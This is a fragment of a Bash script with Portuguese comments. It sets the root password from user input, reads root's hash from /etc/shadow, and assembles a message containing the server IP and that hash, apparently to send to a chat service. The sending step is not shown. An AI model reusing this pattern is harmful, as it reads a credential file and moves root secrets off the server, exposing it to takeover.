...
# Solicita ao usuário para inserir sua senha
read -s -p "Por favor, insira sua senha: " USER_PASSWORD

# Define a senha fornecida pelo usuário para o usuário root
echo "root:$USER_PASSWORD" | sudo chpasswd

# Captura a senha definida para o usuário root
NEW_ROOT_PASSWORD=$(sudo grep -E '^root:' /etc/shadow | cut -d':' -f2)
...
MESSAGE="Portas abertas no servidor.%0ASeu IP: \`$SERVER_IP\` 🌐%0ASenha do usuário root: \`$NEW_ROOT_PASSWORD\`"
